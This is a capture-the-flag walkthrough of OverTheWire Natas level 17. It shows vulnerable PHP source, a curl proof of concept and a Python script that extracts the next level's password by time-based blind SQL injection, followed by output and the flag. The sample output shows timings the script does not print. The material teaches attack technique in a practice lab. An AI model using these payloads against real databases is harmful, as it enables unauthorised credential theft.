# Level 17
## What does the page look like?
```html
$ curl -s --user natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Source code
```html
$ curl -s --user natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</
script></head>
<body>
<h1>natas17</h1>
<div id="content">
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST
["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Time base SQL Injection
Below is the proof of concept:
~~~
$ curl -s -d 'username=natas18" AND IF(BINARY LEFT(password,3)="abc",0,SLEEP(5));#' -X POST --user natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/?debug
~~~
The below request will return a result immediately if the first 3 letters (`abc`) are correct. Else, it will wait 5 seconds before returning.

Now, let's script it in python.

```python
#!/usr/bin/env python3
import requests
import time

auth_user = 'natas17'
auth_pwd = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
target = "http://natas17.natas.labs.overthewire.org/?debug"

password = ''

# We know the password is 32 characters long
for pos in range(33):
	for i in range(48,123):
		# only include a-z, A-Z and 0-9
		if (i>47 and i<58) or (i>64 and i<91) or (i>96):
			sqli = {'username': 'natas18" AND IF(BINARY LEFT(password,%s)="%s%s",0,SLEEP(5));#' % (len(password), password, chr(i))}
			start_time = time.time()
			r = requests.post(
				target,
				auth=requests.auth.HTTPBasicAuth(auth_user, auth_pwd),
				data = sqli
				)
			end_time = time.time()
			# If the request took less than 4 seconds, the password was correct
			if end_time - start_time < 4:
				# Once letter is found, it is added to the password and we jump to the next letter
				password += chr(i)
				print(password)
				print("[SUCCESS] %s" % password)
				break
			else:
				print("[FAIL] %s%s" % (password, chr(i)))
```

Below is an extract of the output:
~~~
$ python bruteforce.py 
[FAIL] 0 (3.2826130390167236 sec)
[FAIL] 1 (3.1410295963287354 sec)
[FAIL] 2 (3.146009683609009 sec)
[FAIL] 3 (3.144606351852417 sec)
[FAIL] 4 (3.151423454284668 sec)
[FAIL] 5 (3.238243341445923 sec)
[FAIL] 6 (3.2439956665039062 sec)
[FAIL] 7 (3.146272897720337 sec)
[FAIL] 8 (3.1217193603515625 sec)
[FAIL] 9 (3.169898271560669 sec)
...
[FAIL] s (3.342233419418335 sec)
[FAIL] t (3.3324503898620605 sec)
[FAIL] u (4.2216479778289795 sec)
[FAIL] v (3.145320177078247 sec)
[FAIL] w (3.1478209495544434 sec)
x
[SUCCESS] x (0.4902353286743164 sec)
[FAIL] x0 (5.799633026123047 sec)
[FAIL] x1 (3.5391054153442383 sec)
[FAIL] x2 (3.347290277481079 sec)
...
[FAIL] xr (4.325707197189331 sec)
[FAIL] xs (3.341364622116089 sec)
[FAIL] xt (4.130222320556641 sec)
[FAIL] xu (4.336754560470581 sec)
xv
[SUCCESS] xv (0.1643984317779541 sec)
[FAIL] xv0 (3.2627835273742676 sec)
[FAIL] xv1 (3.2506089210510254 sec)
...
[FAIL] xvI (3.3424103260040283 sec)
[FAIL] xvJ (3.3417890071868896 sec)
xvK
[SUCCESS] xvK (0.30319881439208984 sec)
[FAIL] xvK0 (3.2358806133270264 sec)
[FAIL] xvK1 (3.3428452014923096 sec)
[FAIL] xvK2 (3.6654703617095947 sec)
...
...
[FAIL] xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdN (3.2562294006347656 sec)
[FAIL] xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdO (3.232388496398926 sec)
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
~~~

# Flag
~~~~
natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
~~~~